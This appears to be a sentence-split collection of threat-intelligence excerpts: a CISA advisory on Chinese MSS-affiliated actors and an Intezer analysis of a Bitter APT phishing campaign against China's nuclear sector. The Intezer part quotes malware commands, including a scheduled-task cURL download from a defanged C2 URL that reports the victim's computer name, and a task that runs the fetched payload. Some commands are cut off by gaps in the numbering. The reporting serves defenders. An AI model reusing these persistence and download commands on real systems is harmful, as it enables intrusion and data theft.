sentence.8299: While many organizations are now focusing more on perimeter defenses and two-factor authentication after recent public examples of password reuse or VPN appliance exploitation, monitoring on endpoints is often overlooked or left to traditional antivirus.
sentence.8300: A well-rounded security program is essential to mitigate risk from sophisticated groups such as UNC2465 as they continue to adapt to a changing security landscape.

sentence.8351: title: AA20-258A: Chinese Ministry of State Security-Affiliated Cyber Threat Actor Activity url: https://us-cert.cisa.gov/ncas/alerts/aa20-258a Original release date: September 14, 2020 | Last revised: October 24, 2020SummaryThe Cybersecurity and Infrastructure Security Agency (CISA) has consistently observed Chinese Ministry of State Security (MSS)-affiliated cyber threat actors using publicly available information sources and common, well-known tactics, techniques, and procedures (TTPs) to target U.S. Government agencies.
sentence.8352: CISA has observed these—and other threat actors with varying degrees of skill—routinely using open-source information to plan and execute cyber operations.
sentence.8353: CISA leveraged the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK:registered:) and Pre-ATT&CK frameworks to characterize the TTPs used by Chinese MSS-affiliated actors.
sentence.8354: This product was written by CISA with contributions by the Federal Bureau of Investigation (FBI).
sentence.8355: Key Takeaways Chinese MSS-affiliated cyber threat actors use open-source information to plan and conduct cyber operations.
sentence.8356: Chinese MSS-affiliated cyber threat actors use readily available exploits and exploit toolkits to quickly engage target networks.
sentence.8357: Maintaining a rigorous patching cycle continues to be the best defense against the most frequently used attacks.
sentence.8358: If critical vulnerabilities remain unpatched, cyber threat actors can carry out attacks without the need to develop custom malware and exploits or use previously unknown vulnerabilities to target a network.
sentence.8359: This Advisory identifies some of the more common—yet most effective—TTPs employed by cyber threat actors, including Chinese MSS-affiliated cyber threat actors.
sentence.8360: Click here for a PDF version of this report.
sentence.8361: Technical DetailsThrough the operation of the National Cybersecurity Protection System (NCPS) and by fulfilling its mission as the national risk advisor, CISA has observed Chinese MSS-affiliated cyber threat actors operating from the People’s Republic of China using commercially available information sources and open-source exploitation tools to target U.S. Government agency networks.
sentence.8362: According to a recent U.S. Department of Justice indictment, MSS-affiliated actors have targeted various industries across the United States and other countries—including high-tech manufacturing; medical device, civil, and industrial engineering; business, educational, and gaming software; solar energy; pharmaceuticals; and defense—in a campaign that lasted over ten years.[1]
sentence.8363: These hackers acted for both their own personal gain and the benefit of the Chinese MSS.[2] According to the indictment, To conceal the theft of information from victim networks and otherwise evade detection, the defendants typically packaged victim data in encrypted Roshal Archive Compressed files (RAR files), changed RAR file and victim documents’ names and extensions (e.g., from “.rar” to “.jpg”) and system timestamps, and concealed programs and documents at innocuous-seeming locations on victim networks and in victim networks’ “recycle bins.”
sentence.8364: The defendants frequently returned to re-victimize companies, government entities, and organizations from which they had previously stolen data, in some cases years after the initial successful data theft.
sentence.8365: In several instances, however, the defendants were unsuccessful in this regard, due to the efforts of the FBI and network defenders.
sentence.8366: The continued use of open-source tools by Chinese MSS-affiliated cyber threat actors highlights that adversaries can use relatively low-complexity capabilities to identify and exploit target networks.
sentence.8367: In most cases, cyber operations are successful because misconfigurations and immature patch management programs allow actors to plan and execute attacks using existing vulnerabilities and known exploits.
sentence.8368: Widespread implementation of robust configuration and patch management programs would greatly increase network security.
sentence.8369: It would also reduce the speed and frequency of opportunistic attacks by forcing threat actors to dedicate time and funding to research unknown vulnerabilities and develop custom exploitation tools.
sentence.8370: MITRE PRE-ATT&CK:registered: Framework for Analysis In the last 12 months, CISA analysts have routinely observed Chinese MSS-affiliated actors using the following PRE-ATT&CK:registered: Framework TTPs. Target Selection and Technical Information Gathering Target Selection [TA0014] is a critical part of cyber operations.
sentence.8371: While cyber threat actors’ motivations and intents are often unknown, they often make their selections based on the target network’s security posture.
sentence.8372: Threat actors can use information sources such as Shodan, the Common Vulnerabilities and Exposure (CVE) database, and the National Vulnerabilities Database (NVD).[3][4][5] Shodan is an internet search engine that can be used to identify vulnerable devices connected to the internet.
sentence.8373: Shodan queries can also be customized to discover specific vulnerabilities on devices, which enables sophisticated cyber threat actors to use relatively unsophisticated techniques to execute opportunistic attacks on susceptible targets.
sentence.8374: The CVE database and the NVD contain detailed information about vulnerabilities in applications, appliances, and operating systems that can be exploited by cyber threat actors if they remain unpatched.
sentence.8375: These sources also provide risk assessments if any of the recorded vulnerabilities are successfully exploited.
sentence.8376: These information sources have legitimate uses for network defense.
sentence.8377: CISA analysts are able to identify Federal Government systems that may be susceptible to exploitation attempts by using Shodan, the CVE database, and the NVD to enrich NCPS information.
sentence.8378: Unlike threat actors, CISA takes the necessary actions to notify network owners of their exposure in order to prevent an impending intrusion or quickly identify intrusions as they occur.
sentence.8379: While using these data sources, CISA analysts have observed a correlation between the public release of a vulnerability and targeted scanning of systems identified as being vulnerable.
sentence.8380: This correlation suggests that cyber threat actors also rely on Shodan, the CVE database, the NVD, and other open-source information to identify targets of opportunity and plan cyber operations.
sentence.8381: Together, these data sources provide users with the understanding of a specific vulnerability, as well as a list of systems that may be vulnerable to attempted exploits.
sentence.8382: These information sources therefore contain invaluable information that can lead cyber threat actors to implement highly effective attacks.
sentence.8383: CISA has observed Chinese MSS-affiliated actors using the techniques in table 1 to gather technical information to enable cyber operations against Federal Government networks (Technical Information Gathering [TA0015]).
sentence.8384: Table 1: Technical information gathering techniques observed by CISA MITRE ID Name Observation T1245 Determine Approach/Attack Vector
sentence.8385: The threat actors narrowed the attack vectors to relatively recent vulnerability disclosures with open-source exploits.
sentence.8386: T1247 Acquire Open Source Intelligence (OSINT) Data Sets and Information CISA observed activity from network proxy service Internet Protocol (IP) addresses to three Federal Government webpages.
sentence.8387: This activity appeared to enable information gathering activities.
sentence.8388: T1254 Conduct Active Scanning CISA analysts reviewed the network activity of known threat actor IP addresses and found evidence of reconnaissance activity involving virtual security devices.
sentence.8389: Technical Weakness Identification CISA analysts consistently observe targeting, scanning, and probing of significant vulnerabilities within days of their emergence and disclosure.
sentence.8390: This targeting, scanning, and probing frequently leads to compromises at the hands of sophisticated cyber threat actors.
sentence.8391: In some cases, cyber threat actors have used the same vulnerabilities to compromise multiple organizations across many sectors.
sentence.8392: Organizations do not appear to be mitigating known vulnerabilities as quickly as cyber threat actors are exploiting them.
sentence.8393: CISA recently released an alert that highlighted the top 10 vulnerabilities routinely exploited by sophisticated foreign cyber threat actors from 2016 to 2019.[6] Additionally, table 2 provides a list of notable compromises by Chinese MSS-affiliated actors within the past 12 months.
sentence.8394: Table 2: Significant CVEs targeted by Chinese MSS-affiliated actors in the last 12 months Vulnerability Observations CVE-2020-5902:
sentence.8395: F5 Big-IP Vulnerability CISA has conducted incident response engagements at Federal Government and commercial entities where the threat actors exploited CVE-2020-5902.
sentence.8396: This is a vulnerability in F5’s Big-IP Traffic Management User Interface that allows cyber threat actors to execute arbitrary system commands, create or delete files, disable services, and/or execute Java code.[7] CVE-2019-19781:
sentence.8398: Appliances CISA has observed the threat actors attempting to discover vulnerable Citrix VPN Appliances.
sentence.8399: CVE-2019-19781 enabled the actors to execute directory traversal attacks.[8] CVE-2019-11510:
sentence.8400: Pulse Secure VPN Servers CISA has conducted multiple incident response engagements at Federal Government and commercial entities where the threat actors exploited CVE-2019-11510—an arbitrary file reading vulnerability affecting Pulse Secure VPN appliances—to gain access to victim networks.
sentence.8401: Although Pulse Secure released patches for CVE-2019-11510 in April 2019, CISA observed incidents where compromised Active Directory credentials were used months after the victim organization patched their VPN appliance.[9] CVE-2020-0688: Microsoft Exchange Server CISA has observed the actors exploiting CVE-2020-0688 for remote code execution to enable email collection of targeted networks.
sentence.8402: Additionally, CISA has observed Chinese MSS-affiliated actors using the techniques listed in table 3 to identify technical weaknesses in Federal Government networks (Technical Weakness Identification [TA0018]).
sentence.8403: Table 3: Technical weakness identification techniques observed by CISA MITRE ID Name Observation T1288 Analyze Architecture and Configuration Posture CISA observed the cyber actors scanning a Federal Government agency for vulnerable web servers.
sentence.8404: CISA also observed the threat actors scanning for known vulnerable network appliance CVE-2019-11510.
sentence.8405: T1291 Research Relevant Vulnerabilities CISA has observed the threat actors scanning and reconnaissance of Federal Government internet-facing systems shortly after the disclosure of significant CVEs. Build Capabilities CISA analysts have observed cyber threat actors using command and control (C2) infrastructure as part of their cyber operations.
sentence.8406: These observations also provide evidence that threat actors can build and maintain relatively low-complexity capabilities, such as C2, to enable cyber operations against Federal Government networks (Build Capabilities [TA0024]).
sentence.8407: CISA has observed Chinese MSS-affiliated actors using the build capabilities summarized in table 4. Table 4: Build capabilities observed by CISA MITRE ID Name Observation T1352 C2 Protocol Development CISA observed beaconing from a Federal Government entity to the threat actors’ C2 server.
sentence.8408: T1328 Buy Domain Name CISA has observed the use of domains purchased by the threat actors.
sentence.8409: T1329 Acquire and / or use of 3rd Party Infrastructure CISA has observed the threat actors using virtual private servers to conduct cyber operations.
sentence.8410: T1346 Obtain/Re-use Payloads CISA has observed the threat actors use and reuse existing capabilities.
sentence.8411: T1349 Build or Acquire Exploit CISA has observed the threat actors using a variety of open-source and publicly available exploits and exploit code to compromise Federal Government networks.
sentence.8412: MITRE ATT&CK Framework for Analysis CISA has observed sophisticated cyber threat actors, including Chinese MSS-affiliated actors, using commercial and open-source tools to conduct their operations.
sentence.8413: For example, threat actors often leverage internet software repositories such as GitHub and Exploit-DB.[10][11]
sentence.8414: Both repositories are commonly used for legitimate development and penetration testing and developing open-source code, but cyber threat actors can also use them to find code to enable nefarious actions.
sentence.8415: During incident response activities, CISA frequently observed Chinese government-affiliated actors using the open-source tools outlined in table 5. Table 5: Common exploit tools CISA observed used by Chinese MSS-affiliated actors Tool Observations Cobalt Strike CISA has observed the threat actors using Cobalt Strike to target commercial and Federal Government networks.
sentence.8416: Cobalt Strike is a commercial penetration testing tool used to conduct red team operations.
sentence.8417: It contains a number of tools that complement the cyber threat actor’s exploitation efforts, such as a keystroke logger, file injection capability, and network services scanners.
sentence.8418: CISA observed connections from a Federal Government agency to multiple IP addresses possibly hosting Cobalt Strike team servers.
sentence.8419: China Chopper Web Shell CISA has observed the actors successfully deploying China Chopper against organizations’ networks.
sentence.8420: This open-source tool can be downloaded from internet software repositories such GitHub and Exploit-DB.
sentence.8421: China Chopper is a web shell hosted on a web server.
sentence.8422: It is mainly used for web application attacks, and it is configured in a client/server relationship.
sentence.8423: China Chopper contains security scanners and can be used to upload files and brute-force passwords.
sentence.8424: Mimikatz CISA has observed the actors using Mimikatz during their operations.
sentence.8425: This open-source tool is used to capture account credentials and perform privilege escalation with pass-the-hash attacks that allow an attacker to pass captured password hashes and authenticate to network devices.[12] The following sections list the ATT&CK Framework TTPs routinely employed by Chinese government-affiliated actors to conduct cyber operations as observed by CISA analysts.
sentence.8427: In the last 12 months, CISA has observed Chinese MSS-affiliated actors use spearphishing emails with embedded links to actor-owned infrastructure and, in some cases, compromise or poison legitimate sites to enable cyber operations.
sentence.8428: CISA has observed the threat actors using the Initial Access [TA0001] techniques identified in table 6. Table 6: Initial access techniques observed by CISA MITRE ID Name Observation T1204.001 User Execution: Malicious Link CISA has observed indications that users have clicked malicious links embedded in spearphishing emails that the threat actors sent T1566.002 Phishing: Spearphishing Link CISA analyzed network activity of a Federal Government entity and concluded that the threat actors sent a malicious email weaponized with links.
sentence.8429: T1190 Exploit Public-Facing Application CISA has observed the actors leveraging CVE-2019-19781 to compromise Citrix Application Delivery Controllers.
sentence.8430: Cyber threat actors can continue to successfully launch these types of low-complexity attacks—as long as misconfigurations in operational environments and immature patch management programs remain in place—by taking advantage of common vulnerabilities and using readily available exploits and information.
sentence.8431: Execution CISA analysts continue to observe beaconing activity indicative of compromise or ongoing access to Federal Government networks.
sentence.8432: This beaconing is a result of cyber threat actors successfully completing cyber operations that are often designed around emergent vulnerabilities and reliant on existing exploitation tools, as mentioned in this document.
sentence.8433: CISA has observed Chinese MSS-affiliated actors using the Execution [TA0002] technique identified in table 7. Table 7: Execution technique observed by CISA MITRE ID Name Observation T1072 Software Deployment Tools CISA observed activity from a Federal Government IP address beaconing out to the threat actors’ C2 server, which is usually an indication of compromise.
sentence.8434: Credential Access Cyber threat actors also continue to identify large repositories of credentials that are available on the internet to enable brute-force attacks.
sentence.8435: While this sort of activity is not a direct result of the exploitation of emergent vulnerabilities, it demonstrates that cyber threat actors can effectively use available open-source information to accomplish their goals.
sentence.8436: Further, a threat actor does not require a high degree of competence or sophistication to successfully carry out this kind of opportunistic attack.
sentence.8437: CISA has observed Chinese MSS-affiliated actors using the Credential Access
sentence.8440: Credential access techniques observed by CISA MITRE ID Name Observation T1003.001 Operating System (OS)
sentence.8441: Credential Dumping: Local Security Authority Subsystem Service (LSASS) Memory CISA observed the threat actors using Mimikatz in conjunction with coin miner protocols and software.
sentence.8442: The actors used Mimikatz to dump credentials from the OS using a variety of capabilities resident within the tool.
sentence.8443: T1110.004 Brute Force: Credential Stuffing CISA observed what was likely a brute-force attack of a Remote Desktop Protocol on a public-facing server. Discovery As with any cyber operation, cyber threat actors must be able to confirm that their target is online and vulnerable—there are a multitude of open-source scanning and reconnaissance tools available to them to use for this purpose.
sentence.8444: CISA consistently observes scanning activity across federal agencies that is indicative of discovery techniques.
sentence.8445: CISA has observed Chinese MSS-affiliated actors scanning Federal Government traffic using the discovery technique highlighted in table 9 (Discovery [TA0007]).
sentence.8446: Table 9: Discovery technique observed by CISA MITRE ID Name Observation T1046 Network Service Scanning CISA has observed suspicious network scanning activity for various ports at Federal Government entities.
sentence.8447: Collection Within weeks of public disclosure of CVE-2020-0688, CISA analysts identified traffic that was indicative of Chinese MSS-affiliated threat actors attempting to exploit this vulnerability using the Collection [TA0009] technique listed in table 10. Table 10: Collection technique observed by CISA MITRE ID Name Observation T1114 Email Collection CISA observed the actors targeting CVE-2020-0688 to collect emails from the exchange servers found in Federal Government environments.
sentence.8448: Command and Control CISA analysts often observe cyber threat actors using external proxy tools or hop points to enable their cyber operations while remaining anonymous.
sentence.8449: These proxy tools may be commercially available infrastructure as a service (IaaS) or software as a service (SaaS) in the form of a web browser promising anonymity on the internet.
sentence.8450: For example, “The Onion Router” (Tor) is often used by cyber threat actors for anonymity and C2.
sentence.8451: Actor’s carefully choose proxy tools depending on their intended use.
sentence.8452: These techniques are relatively low in complexity and enabled by commercially available tools, yet they are highly effective and often reliant upon existing vulnerabilities and readily available exploits.
sentence.8453: CISA has observed Chinese MSS-affiliated actors using the Command and Control [TA0011] techniques listed in table 11.
sentence.8454: Table 11: Command and control techniques observed by CISA MITRE ID Name Observation T1090.002 Proxy: External Proxy CISA observed activity from a network proxy tool to 221 unique Federal Government agency IP addresses.
sentence.8456: Proxy CISA observed activity from Tor that has resulted in confirmed compromises of internet-facing Federal Government agency systems.
sentence.8457: T1573.002 Encrypted Channel: Asymmetric Cryptography CISA observed activity from Tor that has resulted in confirmed compromises of internet-facing Federal Government agency systems.
sentence.8458: MitigationsCISA asserts with high confidence that sophisticated cyber threat actors will continue to use open-source resources and tools to target networks with a low security posture.
sentence.8459: When sophisticated cyber threat actors conduct operations against soft targets, it can negatively impact critical infrastructure, federal, and state, local, tribal, territorial government networks, possibly resulting in loss of critical data or personally identifiable information.
sentence.8460: CISA and the FBI recommend that organizations place an increased priority on patching the vulnerabilities routinely exploited by MSS-affiliated cyber actors.
sentence.8461: See table 12 for patch information on the CVEs mentioned in this report.
sentence.8462: For more information on vulnerabilities routinely exploited by sophisticated cyber actors, see CISA Alert: Top 10 Routinely Exploited Vulnerabilities.

sentence.8477: title: Phishing Campaign Targets Chinese Nuclear Energy Industry url: https://www.intezer.com/blog/research/phishing-campaign-targets-nuclear-energy-industry/ Intezer has been tracking activity targeting the energy sector and noted a campaign with techniques that align with those of Bitter APT, operating in the Asia-Pacific region.
sentence.8478: We have made the connection to Bitter APT through tactics, techniques, and procedures (TTPs) that have been observed in other publications, such as the use of Microsoft Office exploits through Excel files, and the use of CHM and Windows Installer (MSI) files.
sentence.8479: Bitter APT is a South Asian threat group that commonly targets energy and government sectors; they have been known to target Pakistan, China, Bangladesh, and Saudi Arabia.
sentence.8480: Bitter APT are continuing to target organizations in China in an espionage campaign, as our here research shows.
sentence.8481: For some of the payloads we have corresponding phishing emails that were used as lures to deliver the files, allowing analysis of the social engineering techniques used.
sentence.8482: We have noted updates to the first-stage payloads used, with new layers of obfuscation to hinder analysis and additional decoys used for social engineering.
sentence.8483: Analysis of Phishing Lures and Payloads We identified seven emails pretending to be from the Embassy of Kyrgyzstan, being sent to recipients in the nuclear energy industry in China.
sentence.8484: In some emails, people and entities in academia are also targeted, also related to nuclear energy.
sentence.8485: The phishing emails contain a lure that invites the recipients to join conferences on subjects that are relevant to them.
sentence.8486: The lures are designed to socially engineer the recipient to download and open an attached RAR file that contains either a Microsoft Compiled HTML Help (CHM) or Excel payload.
sentence.8487: This activity appears to be a continuation of the tactics and campaign that Bitter APT have been using since at least 2021.
sentence.8488: Figure 1: Attack flow described in this research Social Engineering with Phishing Emails The emails contain a number of social engineering techniques.
sentence.8489: The name and email address used to send the phishing emails is crafted to look like it is coming from an “Embassy in Beijing.”
sentence.8490: A free email provider is used, therefore domain reputation checks will not be useful.
sentence.8491: Figure 2: Name crafted to appear as communication from an embassy The email is signed off with the name and details of an actual attaché of the Kyrgyz embassy in China.
sentence.8492: If the recipient were to use a search engine to check for this employee, they would easily be able to find corroborating information from LinkedIn and the Ministry of Foreign Affairs website for Kyrgyzstan, adding to the supposed legitimacy of the email.
sentence.8493: This is presumably also how the malicious actor was able to get information in order to craft the lure.
sentence.8494: The email subject and body use terms and themes that would be familiar with the recipients in governmental and energy sectors, such as International Atomic Energy Agency (IAEA), China Institute of International Studies (CIIS), strategic alliances, and nuclear doctrines.
sentence.8495: Figure 3: Email body lure with nuclear themes Malicious Payloads via CHM and Microsoft Excel Files Multiple payloads have been observed being delivered.
sentence.8496: Either CHM files, or Microsoft Excel files with Equation Editor exploits.
sentence.8497: These payloads are compressed inside RAR files, this helps avoid static analysis techniques that do not decompress the files first.
sentence.8498: The purpose of the payloads are to create persistence and download further malware payloads.
sentence.8499: We were not able to get further additional payloads from the command and control (C2) servers, but in some instances were able to get the file names of next stages from active C2s.
sentence.8500: Malicious Microsoft Excel Files The Excel payloads simply contain an Equation Editor exploit that creates two different scheduled tasks.
sentence.8501: There is no decoy in the document.
sentence.8502: One scheduled task (shown below) runs every 15 minutes, to download a next stage EXE payload using cURL, also sending the actor the name of the infected machine.
sentence.8503: These tactics have been observed being used by Bitter APT in 2021/2022.
sentence.8507: -O ""https://qwavemediaservice[.]net/hkcu/qt.php/?dt=%computername%-QT-2&ct=QT""" /f Figure 4: Scheduled task The second scheduled task created attempts to execute the payload downloaded by the other task: "C:\Windows\System32\schtasks.exe" /create /sc MINUTE /mo 20 /TN \Windows\DWM\DWMCORELIB /TR
sentence.8508: "%AppData%\dwmcor.exe" /f CHM Files The more common payloads contained within the RAR files are Microsoft Compiled HTML Help (CHM) files.
sentence.8509: These can be used to simply execute arbitrary code, in these cases, they are also used to create scheduled tasks for persistence and downloading of the next stage.
sentence.8510: We have noted multiple versions of these CHM payloads.
sentence.8511: CHM payloads are useful for the actor as it requires a low amount of user interaction, it does not require a vulnerable version of Microsoft Office installed like the Excel files, and it also uses LZX compression that will bypass static malware analysis solutions that do not decompress the file.
sentence.8512: The first version of the CHM file will create a scheduled task that will use the living off the land binary msiexec to execute a remote MSI payload from the C2.
sentence.8513: String concatenation is used to break up the string for obfuscation.
sentence.8514: The computer name and the username is also sent to the C2.
sentence.8520: We did not fetch any additional payloads from the C2, but we were served empty MSI files, allowing us to discover the names of the next stage payloads.
sentence.8521: Figure 5: Empty payloads served from different C2 servers This may allow the actor to examine the server logs of beaconing infected machines before deciding whether to swap out the empty file with an actual payload if the target looks promising enough, thus protecting the next stage of the attack.
sentence.8522: Bitter APT do not appear to change their tactics too much, therefore we can assume that the payloads will be similar to those observed in 2021, executing a downloader module that can be served with plugins such as a keylogger, remote access tool, file stealer, or browser credential stealer.
sentence.8523: The second version of the CHM payload abstracts the same activity through an encoded PowerShell command stage, obfuscating the activity further than just simple string concatenation.
sentence.8524: Figure 6: Encoded PowerShell command in version 2 of the CHM files
sentence.8525: The decoded command is the following: schtasks /create
sentence.8531: It is evident that the C2 controllers have been updated also as now only the computer name is sent to the C2 and not the username.
sentence.8532: What is interesting about the next version is that it now contains a decoy picture when opened: Figure 7: Decoy picture The decoy appears to reference the United Front Work Department of the Central Committee of the Chinese Communist Party.
sentence.8533: The following is a machine translated version of the same picture for reference (please note that the translation will not be fully accurate and should be used for reference purposes only): Figure 8: Machine translated version of the decoy Conclusion Bitter APT have been conducting espionage campaigns for years using many tactics, including phishing, to achieve their goals.
sentence.8534: It is advised that entities in government, energy, and engineering especially those in the Asia-Pacific region should remain vigilant when receiving emails, especially those claiming to be from other diplomatic entities.
sentence.8535: Always verify that the sender is trusted and understand that even if it claims to be from a particular person, it might not be.
sentence.8536: None of the social engineering techniques used are novel and it is imperative that employees of companies should have a good standard of security awareness about phishing emails.
sentence.8537: Always take care when handling attachments, and never open CHM files as they are antiquated and not commonly used for legitimate purposes currently.
